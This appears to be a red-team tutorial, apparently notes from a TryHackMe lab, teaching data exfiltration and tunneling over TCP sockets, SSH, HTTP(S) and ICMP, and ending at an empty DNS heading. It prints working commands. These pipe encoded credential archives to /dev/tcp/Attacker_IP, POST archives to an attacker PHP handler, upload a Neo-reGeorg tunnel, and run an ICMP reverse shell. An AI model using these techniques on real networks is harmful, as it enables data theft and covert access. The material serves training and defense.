
# Data Exfiltration

An introduction to Data Exfiltration and Tunneling techniques over various protocols.

## What is Data Exfiltration ?

Data Exfiltration is the process of taking an unauthorized copy of sensitive data and moving it from the inside of an organization's network to the outside. It is important to note that Data Exfiltration is a post-compromised process where a threat actor has already gained access to a network and performed various activities to get hands on sensitive data. Data Exfiltration often happens at the last stage of the Cyber Kill Chain model, Actions on Objectives.

-------------------------------------------------------

## Network Infrastructure

we have built a network to simulate practical scenarios where we can perform data exfiltration and tunneling using various network protocols. The provided VM contains two separated networks with multiple clients. We also have a "JumpBox" machine that accesses both networks.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/1.png)

Use the network diagram for your reference during the coming tasks for various protocols. We also set up a domain name, thm.com, to make it easier to communicate and connect within the network environment. Check the following table for more information about the domain names and network access used in this room.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/2.png)

-------------------------------------------------------

## How to use Data Exfiltration

There are three primary use case scenarios of data exfiltration, including:

1. Exfiltrate data
2. Command and control communications.
3. Tunneling

### Traditional Data Exfiltration

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/3.png)

The traditional Data Exfiltration scenario is moving sensitive data out of the organization's network. An attacker can make one or more network requests to transfer the data, depending on the data size and the protocol used. Note that a threat actor does not care about the reply or response to his request. Thus, all traffic will be in one direction, from inside the network to outside. Once the data is stored on the attacker's server, he logs into it and grabs the data.

### C2 Communications

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/4.png)

Many C2 frameworks provide options to establish a communication channel, including standard and non-traditional protocols to send commands and receive responses from a victim machine. In C2 communications a limited number of requests where an attacker sends a request to execute a command in the victim's machine. Then, the agent's client executes the command and sends a reply with the result over a non-traditional protocol. The communications will go in two directions: into and out of the network.

### Tunneling

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/5.png)

In the Tunneling scenario, an attacker uses this data exfiltration technique to establish a communication channel between a victim and an attacker's machine. The communication channel acts as a bridge to let the attacker machine access the entire internal network. There will be continuous traffic sent and received while establishing the connection.

-------------------------------------------------------

## Exfiltration using TCP socket

This task shows how to exfiltrate data over TCP using data encoding. Using the TCP socket is one of the data exfiltration techniques that an attacker may use in a non-secured environment where they know there are no network-based security products. If we are in a well-secured environment, then this kind of exfiltration is not recommended. This exfiltration type is easy to detect because we rely on non-standard protocols.

Besides the TCP socket, we will also use various other techniques, including `data encoding and archiving`. One of the benefits of this technique is that it encodes the data during transmission and makes it harder to examine.

The following diagram explains how traditional communications over TCP work.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/6.png)

* Communication over TCP requires two machines, one victim and one attacker machine, to transfer data.

#### On Attacker_Machine/JumpBox

we need to prepare a listener

`nc -lvp 8080 > /tmp/task4-creds.data`

#### On Victim_Machine

`ssh thm@victim1.thm.com` already compromise ssh connection

We have the required data ready to be transmitted on the victim machine. In this case, we have a sample file with a couple of credentials.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/7.PNG)

Now that we have the credential text file, we will use the TCP socket to exfiltrate it. **Make sure the listener is running on the JumpBox/Attacker_Machine.**

`tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/Attacker_IP/8080`

**Note that we used the Base64 and EBCDIC encoding to protect the data during the exfiltration.**

#### On Attacker_Machine/JumpBox

we should receive the encoded data in the /tmp/ directory.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/8.PNG)

On the JumpBox, we need to convert the received data back to its original status. We will be using the dd tool to convert it back.

`dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar`

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/9.PNG)

Next, we need to use the `tar` command to unarchive the `task4-creds.tar` file and check the content as follows,

`tar xvf task4-creds.tar`

Now let's confirm that we have the same data from the victim machine.

Success! We exfiltrated data from a victim machine to an attacker machine using the TCP socket in this task.

-------------------------------------------------------

## Exfiltration using SSH

In this task we will show how to use SSH protocol to exfiltrate data over to an attacking machine. SSH protocol establishes a secure channel to interact and move data between the client and server, so all transmission data is encrypted over the network or the Internet.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/10.png)

To transfer data over the SSH, we can use either the Secure Copy Protocol `SCP` or the SSH client. Let's assume that we don't have the `SCP` command available to transfer data over SSH. Thus, we will focus more on the SSH client in this task.

As we mentioned earlier, an attacker needs to control a server, which in this case has an SSH server enabled, to receive the exfiltrated data. Thus, we will be using the Attack_Machine/JumpBox as our SSH server in this scenario.

Let's assume that we have gained access to sensitive data that must be transmitted securely.  Let's connect to the `victim1` or `victim2` machine.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/11.PNG)

Let's use the same technique we discussed in the "exfiltration using a TCP socket" task, where we will be using the tar command to archive the data and then transfer it.

`tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"`

`"cd /tmp/; tar xpf` : we change the directory and unarchive the passed file.

If we check the attacker machine, we can see that we have successfully transmitted the file.

-------------------------------------------------------

## Exfiltrate using HTTP(S)

This task explains how to use the HTTP/HTTPS protocol to exfiltrate data from a victim to an attacker's machine. As a requirement for this technique, an attacker needs control over a webserver with a `server-side programming language` installed and enabled. We will show a PHP-based scenario in this task, but it can be implemented in any other programming language, such as python, Golang, NodeJS, etc.

### HTTP POST Request

Exfiltration data through the HTTP protocol is one of the best options because it is challenging to detect. It is tough to distinguish between legitimate and malicious HTTP traffic. We will use the POST HTTP method in the data exfiltration, and the reason is with the GET request, all parameters are registered into the log file. While using POST request, it doesn't. The following are some of the POST method benefits:

* POST requests are never cached
* POST requests do not remain in the browser history
* POST requests cannot be bookmarked
* POST requests have no restrictions on `data length`

Let's login to the `web.thm.com` machine using `thm:tryhackme` credentials and inspect the Apache log file with two HTTP requests, one for the GET and the other for the POST, and check what they look like!

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/12.PNG)

Obviously, the first line is a GET request with a file parameter with exfiltrated data. If you try to decode it using the based64 encoding, you would get the transmitted data, which in this case is `thm:tryhackme`. While the second request is a POST to `example.php`, we sent the same base64 data, but it doesn't show what data was transmitted.

**In a typical real-world scenario**, an attacker controls a web server in the cloud somewhere on the Internet. An agent or command is executed from a compromised machine to send the data outside the compromised machine's network over the Internet into the webserver. Then an attacker can log in to a web server to get the data, as shown in the following figure.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/13.png)

## HTTP Data Exfiltration

Based on the attacker configuration, we can set up either HTTP or HTTPS, the encrypted version of HTTP. We also need a PHP page that handles the POST HTTP request sent to the server.


We will be using the HTTP protocol (not the HTTPS) in our scenario. Now let's assume that an attacker controls the `web.thm.com` server, and sensitive data must be sent from the `JumpBox` or  `victim1.thm.com` machine in our Network 2 environment (192.168.0.0/24).  

To exfiltrate data over the HTTP protocol, we can apply the following steps:

1. An attacker sets up a web server with a data handler. In our case, it will be `web.thm.com` and the `contact.php` page as a data handler.
2. A C2 agent or an attacker sends the data. In our case, we will send data using the `curl` command.
3. The webserver receives the data and stores it. In our case, the `contact.php` receives the POST request and stores it into `/tmp`.
4. The attacker logs into the webserver to have a copy of the received data.

Let's follow and apply what we discussed in the previous steps. Remember, since we are using the HTTP protocol, the data will be sent in cleartext. However, we will be using other techniques (tar and base64) to change the data's string format so that it wouldn't be in a human-readable format!

First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a `file` parameter and stores the received data in the `/tmp` directory as `http.bs64` file name.

``` 
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Now from the Jump machine/Attacker_Machine, connect to the victim1.thm.com machine via SSH to exfiltrate the required data over the HTTP protocol. Use the following SSH credentials: `thm:tryhackme`.

`thm@jump-box:~$ ssh thm@victim1.thm.com`

The goal is to transfer the folder's content, stored in `/home/thm/task6`, to another machine over the HTTP protocol.

Now that we have our data, we will be using the `curl` command to send an HTTP POST request with the content of the secret folder as follows,

`thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php`

We used the curl command with `--data` argument to send a POST request via the `file` parameter. Note that we created an archived file of the secret folder using the `tar` command. We also converted the output of the tar command into `base64` representation.

Next, from the `victim1 or JumpBox machine`, let's log in to the webserver, `web.thm.com`, and check the `/tmp` directory if we have successfully transferred the required data. Use the following SSH credentials in order to login into the web: `thm:tryhackme`.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/14.PNG)

Nice! We have received the data, but if you look closely at the `http.bs64` file, you can see it is broken `base64`. This happens due to the URL encoding over the HTTP. The `+` symbol has been replaced with empty spaces, so let's fix it using the `sed` command as follows,

`thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64`

Using the `sed` command, we replaced the spaces with + characters to make it a valid base64 string!

`thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -`

## HTTPS Communications

In the previous section, we showed how to perform Data Exfiltration over the HTTP protocol which means all transmitted data is in cleartext. One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server.

If you apply the same technique we showed previously on a web server with SSL enabled, then we can see that all transmitted data will be encrypted. We have set up our private HTTPS server to show what the transmitted data looks like. If you are interested in setting up your own HTTPS server, we suggest visiting the [Digital Ocean website](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04).

## HTTP Tunneling

Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel!

Before diving into HTTP tunneling details, let's discuss a typical scenario where many internal computers are not reachable from the Internet. For example, in our scenario, the `uploader.thm.com` server is reachable from the Internet and provides web services to everyone. However, the `app.thm.com` server runs locally and provides services only for the internal network as shown in the following figure:

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/15.png)

In this section, we will create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol. Let's say that we found a web application that lets us upload an HTTP tunnel agent file to a victim webserver, `uploader.thm.com`. Once we upload and connect to it, we will be able to communicate with `app.thm.com`. 

For HTTP Tunneling, we will be using a Neo-reGeorg tool to establish a communication channel to access the internal network devices. We have installed the tool in `AttackBox`, and it can be found in the following location:

`root@AttackBox:/opt/Neo-reGeorg#`

Next, we need to generate an encrypted client file to upload it to the victim web server as follows,

`root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm`

The previous command generates encrypted Tunneling clients with `thm` key in the `neoreg_servers/` directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc. In our scenario, we will be uploading the `tunnel.php` file via the uploader machine. To access the uploader machine, you can visit the following URL: http://MACHINE_IP/uploader or https://LAB_WEB_URL.p.thmlabs.com/uploader without the need for a VPN.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/16.png)

To upload the PHP file, use admin as the key to let you upload any files into the `uploader.thm.com`.

We need to use the `neoreg.py` to connect to the client and provide the key to decrypt the tunneling client. We also need to provide a URL to the PHP file that we uploaded on the uploader machine

`root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php`

Once it is connected to the tunneling client, we are ready to use the tunnel connection as a proxy binds on our local machine, `127.0.0.1`, on port `1080`.

For example, if we want to access the app.thm.com, which has an internal IP address `172.20.0.121` on port `80`

`curl --socks5 127.0.0.1:1080 http://172.20.0.121:80`

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/17.PNG)

The following diagram shows the traffic flow as it goes through the uploader machine and then communicates with the internal network devices, which in this case, is the App machine. Note that if we check the network traffic from the App machine, we see that the source IP address of incoming traffic comes from the uploader machine.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/18.png)

-------------------------------------------------------

## Exfiltration using ICMP

In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for Internet Control Message Protocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking

Network devices such as routers use `ICMP` protocol to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the `ping` command to send `ICMP` packets through the network, as shown in the following figure.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/19.png)

The `HOST1` sends an `ICMP` packet with an `echo-request` packet. Then, if `HOST2` is available, it sends an ICMP packet back with an `echo reply` message confirming the availability.

### ICMP Data Section

On a high level, the `ICMP` packet's structure contains a `Data` section that can include strings or copies of other information, such as the `IPv4 header`, used for error messages. The following diagram shows the `Data` section, which is optional to use.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/20.png)

Note that the Data field is optional and could either be empty or it could contain a random string during the communications.

**Let's say** that we need to exfiltrate the following credentials `thm:tryhackme`. First, we need to convert it to its Hex representation and then pass it to the ping command using -p options as follows,

`root@AttackBox$ echo "thm:tryhackme" | xxd -p `

We used the `xxd` command to convert our string to Hex, and then we can use the `ping` command with the Hex value we got from converting the `thm:tryhackme`.

`root@AttackBox$ ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a`

Let's look at the Data section for this packet in the Wireshark.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/21.png)

Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the `ping` command.

### ICMP Data Exfiltration

Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data.

* The Metasploit framework uses the same technique explained in the previous section.

*  However, it will capture incoming ICMP packets and wait for a Beginning of File (BOF) trigger value.

* Once it is received, it writes to the disk until it gets an End of File (EOF) trigger value.

The following diagram shows the required steps for the Metasploit framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/22.png)

Now from the AttackBox, let's set up the Metasploit framework

One of the requirements for this module is to set the `BPF_FILTER` option, which is based on `TCPDUMP` rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,

`msf5 > use auxiliary/server/icmp_exfil`
`msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP`
`msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0`
`msf5 auxiliary(server/icmp_exfil) > run`

We prepared `icmp.thm.com` as a `victim machine` to complete the ICMP task with the required tools. From the `JumpBox`, log in to the `icmp.thm.com` using `thm:tryhackme` credentials.

We have preinstalled the `nping` tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of the `NMAP suite` tools.

First, we will send the BOF trigger from the ICMP machine so that the Metasploit framework starts writing to the disk. 

`thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"`

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/23.PNG)

Let's start sending the required data and the end of the file trigger value from the ICMP machine.

`thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"`

`thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"`

`thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"`

Let's check our AttackBox once we have done sending the data and the ending trigger value.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/24.PNG)

Nice! We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.

Next, we will show executing commands over the ICMP protocol using the ICMPDoor tool. ICMPDoor is an open-source reverse-shell written in Python3 and scapy. The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/25.png)

We have prepared the tools needed for C2 communication over the ICMP protocol on `JumpBox` and the `ICMP-Host machines`. First, we need to log in to the ICMP machine,`icmp.thm.com`, and execute the icmpdoor binary as follows,

`thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133`

Note that we specify the interface to communicate over and the destination IP of the server-side.

Next, log in to the `JumpBox` and execute the `icmp-cnc` binary to communicate with the victim, our ICMP-Host. Once the execution runs correctly, a communication channel is established over the ICMP protocol. Now we are ready to send the command that needs to be executed on the victim machine. 

`thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121`

![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/26.PNG)

Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP. As the previous terminal shows, we requested to execute the `hostname` command, and we received `icmp-host`.

-------------------------------------------------------

## Exfiltration over DNS
















